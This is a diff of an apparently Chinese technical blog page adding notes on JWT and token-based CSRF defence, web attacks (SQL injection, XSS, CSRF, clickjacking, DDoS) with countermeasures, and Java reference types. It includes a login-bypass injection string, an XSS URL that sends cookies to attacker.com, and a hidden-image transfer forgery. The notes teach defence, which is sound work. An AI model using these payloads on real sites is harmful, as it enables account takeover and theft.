+<h3 id="Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理"><a href="#Token-可以降低-CSRF（跨站请求伪造）攻击的风险的原理" class="headerlink" title="Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理"></a>Token 可以降低 CSRF（跨站请求伪造）攻击的风险的原理</h3><p>要达到在使用Token后降低 CSRF攻击风险的目的，可以将Token放到请求头，（如 <code>Authorization</code> 头）中，攻击者在跨站请求中很难修改请求头，并且浏览器不会像处理 Cookie 那样自动将其发送到服务端，需要在编写客户端代码时，手动获取 Token 并将其添加到请求头中，这就阻止了攻击者将 Token 附加到恶意请求中。这种显式发送 Token 的方式有助于降低 CSRF 攻击的风险。</p>
+<p>将 Token 存储在 Cookie 里面并不能降低 CSRF 风险，这样做会使应用面临与传统基于 Cookie 的身份验证相同的 CSRF 攻击风险。</p>
+<p>对于存储在客户端代码的某个存储位置（如 LocalStorage、SessionStorage 或内存，非cookie）的 Token，要求开发者在编写客户端代码时，手动获取 Token 并将其添加到请求头中。例如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://example.com/api/resource&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + token</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准（RFC 7519），它定义了一种紧凑、自包含的 Token 结构。JWT 使用 JSON 对象表示一组声明（Claim），并将其进行 Base64Url 编码和签名或加密，以确保数据的完整性和安全性。JWT 由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。</p>
+<p>Token 和 JWT 的关系是：JWT 是 Token 的一种实现方式。Token 是一种更通用的概念，可以有多种实现方式和数据格式。JWT 是一种具体的 Token 实现，它使用 JSON 对象表示 Token 的内容，并通过 Base64Url 编码和签名或加密来确保数据的完整性和安全性。由于 JWT 的紧凑和自包含特性，它在许多场景下被广泛使用，如身份验证、授权和单点登录（SSO）等。</p>
 <ul>
 <li><p>JSON Web Token（JWT）是一种轻量级的身份验证和授权机制，它使用JSON格式对信息进行编码，以实现安全传输和存储。JWT通常用于Web应用程序中，用于在客户端和服务器之间传递安全的身份认证信息和其他数据。</p>
 </li>
@@ -586,7 +890,125 @@
 <li><p>总之，JWT是一种简单而安全的身份验证和授权机制，可以用于Web应用程序中，以确保用户身份的安全性和可信性。</p>
 </li>
 </ul>
-<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h2 id="跨站请求伪造攻击（CSRF攻击）"><a href="#跨站请求伪造攻击（CSRF攻击）" class="headerlink" title="跨站请求伪造攻击（CSRF攻击）"></a>跨站请求伪造攻击（CSRF攻击）</h2><h2 id="拒绝服务攻击（DDoS-攻击）"><a href="#拒绝服务攻击（DDoS-攻击）" class="headerlink" title="拒绝服务攻击（DDoS 攻击）"></a>拒绝服务攻击（DDoS 攻击）</h2><h2 id="跨站脚本攻击（XSS攻击）"><a href="#跨站脚本攻击（XSS攻击）" class="headerlink" title="跨站脚本攻击（XSS攻击）"></a>跨站脚本攻击（XSS攻击）</h2><h2 id="会话劫持攻击"><a href="#会话劫持攻击" class="headerlink" title="会话劫持攻击"></a>会话劫持攻击</h2>
+<h1 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入（SQL Injection）是一种常见的网络安全漏洞，攻击者通过在用户输入中注入恶意的 SQL 代码，从而操纵后端数据库，获取未授权的数据访问、修改数据、执行管理操作甚至执行任意代码。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
+<p>以下是一个简单的 SQL 注入攻击示例。假设我们有一个基于用户输入的用户名和密码来验证用户身份的 Web 应用。在不考虑 SQL 注入的情况下，登录查询可能如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在这里，<code>$username</code> 和 <code>$password</code> 是从用户输入中获取的。攻击者可以在用户名或密码字段中输入恶意 SQL 代码，例如在用户名字段中输入：<code>admin&#39; --</code>。这会导致生成以下查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">--&#x27; AND password = &#x27;&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>--</code> 是 SQL 中的注释符号，从而使得密码验证部分被注释掉，攻击者可以绕过密码验证，成功登录管理员账户。</p>
+<p>为了防止 SQL 注入攻击，可以采取以下措施：</p>
+<ol>
+<li>参数化查询：使用参数化查询（也称为预编译语句或绑定变量）来与数据库交互，而不是直接在 SQL 语句中拼接用户输入。在SQL语句中，变量用?表示，攻击者就无法改变SQL的结构。参数化查询会将用户输入作为参数传递给查询，而不是作为查询的一部分，从而避免 SQL 注入。</li>
+<li>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。例如，可以限制用户名和密码只包含字母和数字。</li>
+<li>使用存储过程：将 SQL 代码封装在数据库中的存储过程中，并通过参数调用这些过程。这样可以确保 SQL 代码不受用户输入的影响。</li>
+<li>最小权限原则：限制应用程序连接数据库的权限，使其只能访问必要的数据和执行必要的操作，避免使用root等高级权限账户直接连接数据库。这样即使攻击者发起了 SQL 注入攻击，对数据库的潜在破坏也会受到限制。</li>
+<li>数据库错误处理：不要向用户显示详细的数据库错误信息，因为这可能为攻击者提供有关数据库结构和配置的敏感信息。应该将详细的错误信息记录在日志中，并向用户显示简洁的错误消息。</li>
+</ol>
+<h2 id="跨站脚本攻击（XSS攻击）"><a href="#跨站脚本攻击（XSS攻击）" class="headerlink" title="跨站脚本攻击（XSS攻击）"></a>跨站脚本攻击（XSS攻击）</h2><p>跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一种常见的网络安全漏洞，攻击者通过在 Web 应用中注入恶意的脚本（通常为 JavaScript），以受害者身份在其浏览器上执行这些脚本。这种攻击方式通常是由于对用户输入的不充分验证和处理导致的。</p>
+<p>XSS 攻击主要分为三类：</p>
+<ol>
+<li><p>反射型 XSS：恶意脚本通过 URL 参数传递，当用户点击含有恶意链接的网站或邮件时，攻击者的脚本随请求发送到服务器。攻击者可以构造一个恶意链接，将包含恶意脚本的关键词作为 URL 参数传递：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//example.com/search?search=&lt;script&gt;document.location=&#x27;https://attacker.com/steal?cookie=&#x27;+encodeURIComponent(document.cookie);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当受害者点击这个恶意链接时，恶意脚本会作为参数发送到服务器，然后服务器将脚本嵌入到响应页面中。最后，当受害者浏览器加载页面时，恶意脚本被执行。在这个例子中，恶意脚本将受害者的 Cookie 信息发送到攻击者控制的网站。</p>
+</li>
+<li><p>存储型 XSS：恶意脚本被存储在服务器上，当受害者访问包含恶意脚本的页面时，脚本被加载并执行。比如，黑客写下一篇含有恶意代码的博客文章，所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的代码，就会把恶意的脚本保存到服务端。</p>
+</li>
+<li><p>DOM 型 XSS：这类攻击不涉及服务器，而是在客户端通过操纵 DOM（文档对象模型）实现。攻击者在 URL 参数或其他输入途径中注入恶意脚本，然后通过客户端 JavaScript 代码将脚本插入到 DOM 中并执行。</p>
+</li>
+</ol>
+<p>XSS 攻击可能导致以下危害：</p>
+<ul>
+<li>窃取用户敏感信息（如 Cookie、会话令牌等）</li>
+<li>模拟用户行为</li>
+<li>利用受害者的身份执行恶意操作</li>
+<li>向受害者展示虚假信息</li>
+</ul>
+<p>为了防止 XSS 攻击，可以采取以下措施：</p>
+<ol>
+<li><p>输入验证：对用户输入进行严格的验证，限制允许的字符集和格式。</p>
+</li>
+<li><p>输出编码：在将用户输入插入到 HTML 页面中之前，对其进行适当的编码，以防止恶意脚本被解释执行。例如，将尖括号 <code>&lt;</code> 和 <code>&gt;</code> 转换为 HTML 实体 <code>&amp;lt;</code> 和 <code>&amp;gt;</code>。</p>
+</li>
+<li><p>使用内容安全策略（CSP）：CSP 是一种安全特性，可以限制浏览器加载和执行外部资源（如脚本、样式表等）。通过配置 CSP，可以限制脚本来源、禁止内联脚本执行等，从而降低 XSS 攻击的风险。</p>
+</li>
+<li><p>使用 HttpOnly Cookie：将敏感信息（如会话令牌）存储在 HttpOnly Cookie 中，这样 JavaScript 无法访问这些 Cookie，即使发生 XSS 攻击，攻击者也无法窃取这些敏感信息。</p>
+</li>
+<li><p>保持软件更新：及时更新 Web 应用程序及其依赖库，以修复可能存在的安全漏</p>
+</li>
+</ol>
+<h2 id="跨站请求伪造攻击（CSRF攻击）"><a href="#跨站请求伪造攻击（CSRF攻击）" class="headerlink" title="跨站请求伪造攻击（CSRF攻击）"></a>跨站请求伪造攻击（CSRF攻击）</h2><p>跨站请求伪造（Cross-Site Request Forgery，简称 CSRF）是一种网络安全漏洞，攻击者利用受害者的登录状态，在受害者不知情的情况下伪造请求，让受害者执行攻击者指定的操作。这种攻击方式通常利用用户在其他网站的登录状态，以及浏览器自动发送 Cookie 的特性。</p>
+<p>以下是一个简单的 CSRF 攻击示例。假设我们有一个银行网站，用户在登录后可以进行转账操作。转账请求可能如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bank.example.com/transfer?to=account&amp;amount=100</span><br></pre></td></tr></table></figure>
+
+<p>在这里，<code>to</code> 参数表示收款人账户，<code>amount</code> 参数表示转账金额。正常情况下，用户登录银行网站后，通过填写表单发起转账请求。</p>
+<p>攻击者可以构造一个恶意网站或电子邮件，包含一个自动发起转账请求的图像标签：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.example.com/transfer?to=attacker_account&amp;amount=1000&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当受害者访问恶意网站或查看恶意邮件时，浏览器会自动加载图像，从而发起转账请求。如果受害者同时处于银行网站的登录状态，由于浏览器会自动发送 Cookie，转账请求会被银行网站视为合法操作并执行。</p>
+<p>为了防止 CSRF 攻击，可以采取以下措施：</p>
+<ol>
+<li><p>使用安全令牌：为每个会话或表单生成一个随机的安全令牌，将其嵌入到表单或请求中。服务器需要验证表单中的令牌与请求信息中（如Session或Cookie）的令牌是否匹配，以确保请求来自合法用户。</p>
+</li>
+<li><p>SameSite Cookie：将 Cookie 的 SameSite 属性设置为 <code>Strict</code> 或 <code>Lax</code>，以防止跨站请求发送 Cookie。这样，即使攻击者发起 CSRF 攻击，请求也不会附带有效的 Cookie，从而阻止攻击。</p>
+</li>
+<li><p>验证请求来源：检查请求的来源（如 <code>Referer</code> 和 <code>Origin</code> 头），确保请求来自可信的网站。这可以防止跨站请求，但可能受到某些限制（如代理和浏览器设置）。</p>
+</li>
+<li><p>双重验证：对于敏感操作（如转账、密码修改等），使用双重验证（如短信验证码、邮件确认等）确保用户确实想要执行该操作。</p>
+</li>
+<li><p>使用自定义请求头：为 AJAX 请求添加自定义请求头，例如 CSRF-Token，因为跨站请求通常无法修改请求头。在服务器端，验证请求头中的 CSRF-Token 是否有效。</p>
+</li>
+</ol>
+<h2 id="点击劫持攻击"><a href="#点击劫持攻击" class="headerlink" title="点击劫持攻击"></a>点击劫持攻击</h2><p>点击劫持攻击是一种网络安全漏洞，攻击者通过在受害者浏览器中重叠不透明或透明的 Web 页面层，诱导受害者在不知情的情况下点击或与被遮盖的原始页面上的元素进行交互。这种攻击通常利用 HTML 和 CSS 技术实现，并可能导致用户泄露敏感信息或执行不安全操作。</p>
+<p>为了防止点击劫持攻击，可以采取以下措施：</p>
+<ol>
+<li><p>frame busting：通常可以写一段JavaScript代码，以禁止iframe的嵌套，这种方法叫frame busting</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.<span class="property">location</span> != location) &#123;</span><br><span class="line">	top.<span class="property">location</span> = self.<span class="property">location</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 X-Frame-Options 响应头：frame busting存在被绕过的可能，比较好的方案是使用一个HTTP头，X-Frame-Options，服务器可以发送 X-Frame-Options 响应头来指示浏览器不允许将网站嵌入到 iframe 中。这将阻止攻击者使用 iframe 构建点击劫持攻击。例如，设置 <code>X-Frame-Options: DENY</code> 将完全禁止嵌入。</p>
+</li>
+</ol>
+<h2 id="拒绝服务攻击（DDoS-攻击）"><a href="#拒绝服务攻击（DDoS-攻击）" class="headerlink" title="拒绝服务攻击（DDoS 攻击）"></a>拒绝服务攻击（DDoS 攻击）</h2><p>拒绝服务攻击（Denial of Service, 简称 DoS）是一种网络安全攻击，其目的是让目标系统或网络资源无法正常提供服务。分布式拒绝服务攻击（Distributed Denial of Service, 简称 DDoS）是 DoS 攻击的一种，它利用大量分布在不同位置的攻击者（通常是通过僵尸网络）同时向目标发起攻击，从而更有效地干扰目标系统的正常运行。</p>
+<p>DDoS 攻击有多种类型，主要分为以下三类：</p>
+<ol>
+<li><p>网络层攻击：这类攻击主要针对网络基础设施，例如通过 ICMP 洪水攻击，来消耗目标的网络带宽资源，导致正常用户无法访问。</p>
+<p>防御措施：</p>
+<ul>
+<li>增加网络带宽：提升网络带宽可以缓解网络层攻击带来的影响。</li>
+<li>配置防火墙规则：限制 ICMP、UDP 流量，减少恶意流量进入网络。</li>
+<li>采用流量清洗服务：使用第三方 DDoS 防护服务，如 Cloudflare、AWS Shield、Akamai 等，以帮助检测和过滤攻击流量。</li>
+</ul>
+</li>
+<li><p>传输层攻击：这类攻击主要针对目标系统的传输层协议，例如通过 SYN 洪水攻击（发送大量未完成的 TCP 连接请求）、UDP 洪水攻击来消耗目标系统的连接资源，使其无法处理正常用户的连接请求。</p>
+<p>防御措施：</p>
+<ul>
+<li>配置防火墙规则：限制 SYN 数据包的速率，防止攻击者发送大量未完成的连接请求；限制 UDP 流量，减少恶意流量进入网络。</li>
+<li>使用 SYN Cookies：在不需要分配额外资源的情况下，对 SYN 数据包进行验证。</li>
+<li>启用连接限制：限制每个 IP 地址可建立的连接数，降低攻击影响。</li>
+</ul>
+</li>
+<li><p>应用层攻击：这类攻击针对目标系统的应用层服务，例如通过 HTTP 洪水攻击（发送大量伪造的 HTTP 请求）来消耗目标系统的计算资源，导致正常用户无法访问。</p>
+<p>防御措施：</p>
+<ul>
+<li>启用 Web 应用防火墙（WAF）：监控和过滤应用层恶意请求。</li>
+<li>使用内容分发网络（CDN）：通过分布式服务器缓存和提供网站内容，抵抗应用层攻击。</li>
+<li>限制请求速率：对来自单个 IP 地址的请求速率进行限制，防止攻击者发送大量请求。</li>
+<li>使用负载均衡：在多个服务器之间分配流量，分散攻击负载。</li>
+</ul>
+</li>
+</ol>
+<p>综合防御措施：</p>
+<ul>
+<li>网络分层和隔离：实施分层和隔离策略，限制攻击者对关键资源的访问。</li>
+<li>使用安全配置和补丁：保持系统和软件的安全配置，及时应用安全补丁，以减少潜在的漏洞。</li>
+<li>监控和应急计划：持续监控网络流量和系统性能，制定应急计划以应对 DDoS 攻击。</li>
+</ul>
+<h2 id="防火墙和入侵防御系统"><a href="#防火墙和入侵防御系统" class="headerlink" title="防火墙和入侵防御系统"></a>防火墙和入侵防御系统</h2><p>防火墙主要负责阻止或允许网络流量通过，基于预先定义的规则集来对传入和传出流量进行过滤。防火墙的主要目的是在内部网络和外部网络之间建立安全边界。</p>
+<p>入侵检测系统（IDS）则主要用于监控网络流量，以检测潜在的恶意活动。IDS 会根据特征库、异常行为等来识别攻击行为，主要目的是检测潜在的恶意行为，并在检测到时发出警报。</p>
+<p>防火墙和 IDS 之间的关键区别在于，防火墙主要用于过滤网络流量，而 IDS 主要用于监控网络流量并检测异常行为。</p>
+
       
     </div>
 
@@ -1555,7 +1977,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2023-05-09 09:04:41" itemprop="dateModified" datetime="2023-05-09T09:04:41+08:00">2023-05-09</time>
+      <time title="Modified: 2023-05-10 18:14:12" itemprop="dateModified" datetime="2023-05-10T18:14:12+08:00">2023-05-10</time>
     </span>
 
   
@@ -1821,17 +2243,15 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.SoftReference;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">// obj 是一个强引用</span></span><br><span class="line">SoftReference&lt;Object&gt; softReference = <span class="keyword">new</span> <span class="title class_">SoftReference</span>&lt;&gt;(obj); <span class="comment">// softReference 是一个软引用</span></span><br></pre></td></tr></table></figure>
 
 <ol start="3">
-<li>弱引用（Weak Reference）：<br>当一个对象只被弱引用指向时，它在下一次垃圾回收时就会被回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构。</li>
+<li>弱引用（Weak Reference）：<br>  当一个对象只被弱引用指向时，可以被垃圾回收器回收，而不考虑内存是否充足。弱引用主要用于实现弱映射（WeakHashMap）等数据结构，如ThreadLocal的实现就使用了弱引用。若是强引用，即使tl&#x3D;null ，但key的引用依然指向ThreadLocal对象，所以会有内存泄漏，而使用弱引用则不会。具体来说，<code>ThreadLocal</code>由一个名为<code>ThreadLocal.ThreadLocalMap</code>的内部类来保存。在<code>ThreadLocalMap</code>中，set到<code>ThreadLocal</code>对象的值作为值（value），<code>ThreadLocal</code>对象作为键（key），并且key是一个弱引用。这意味着，如果<code>ThreadLocal</code>对象没有其他强引用存在，那么这个<code>ThreadLocal</code>对象就可能在下一次垃圾回收时被回收。但还是有内存泄漏存在，ThreadLocal被回收，key的值变成null，则导致整个value再也无法被访问到，因此依然存在内存泄漏，所以还是需要remve()这个key。</li>
 </ol>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.WeakReference;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>&lt;&gt;(obj);</span><br></pre></td></tr></table></figure>
 
 <ol start="4">
-<li>虚引用（Phantom Reference）：<br>当一个对象只被虚引用指向时，它可以被垃圾回收器回收。</li>
+<li>虚引用（Phantom Reference）：<br>当一个对象只被虚引用指向时，它只是用于跟踪对象是否被回收，可以被垃圾回收器回收。主要用于管理堆外内存，通常和ReferenceQueue结合使用，当DirectByteBuffer对象被回收时，就向ReferenceQueue对象中添加数据，垃圾回收器可以通过检测ReferenceQueue对象得到到这一变化，然后清理堆外内存。和弱引用的区别是弱引用中的对象可以被弱引用变量get到，但是虚引用引用的变量不能被get到。</li>
 </ol>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.ref.PhantomReference;</span><br><span class="line"><span class="keyword">import</span> java.lang.ref.ReferenceQueue;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">ReferenceQueue&lt;Object&gt; referenceQueue = <span class="keyword">new</span> <span class="title class_">ReferenceQueue</span>&lt;&gt;();</span><br><span class="line">PhantomReference&lt;Object&gt; phantomReference = <span class="keyword">new</span> <span class="title class_">PhantomReference</span>&lt;&gt;(obj, referenceQueue);</span><br></pre></td></tr></table></figure>
 
-<p>注：弱引用（Weak Reference）是比虚引用（Phantom Reference）更强的引用类型，因为它可以影响目标对象的生命周期。当一个对象只有弱引用指向它时，垃圾回收器会在下一次垃圾回收时回收这个对象，不考虑内存是否充足。而虚引用则完全不影响目标对象的生命周期，只是用于跟踪对象是否被回收。虚引用通常与<code>ReferenceQueue</code>一起使用，用于在目标对象被垃圾回收时得到通知，以便执行一些特定的清理操作。虚引用的存在不会阻止目标对象被回收，垃圾回收器会根据对象的其他引用类型（如强引用、软引用、弱引用）来决定是否回收目标对象。</p>
-<p>总之，根据不同的引用类型，垃圾回收器会以不同的方式处理被引用的对象。强引用可以确保对象不被回收，而软引用、弱引用和虚引用则允许垃圾回收器在满足一定条件时回收对象。</p>
 <h1 id="JVM的参数配置"><a href="#JVM的参数配置" class="headerlink" title="JVM的参数配置"></a>JVM的参数配置</h1><h2 id="JVM的参数"><a href="#JVM的参数" class="headerlink" title="JVM的参数"></a>JVM的参数</h2><table>
 <thead>
 <tr>
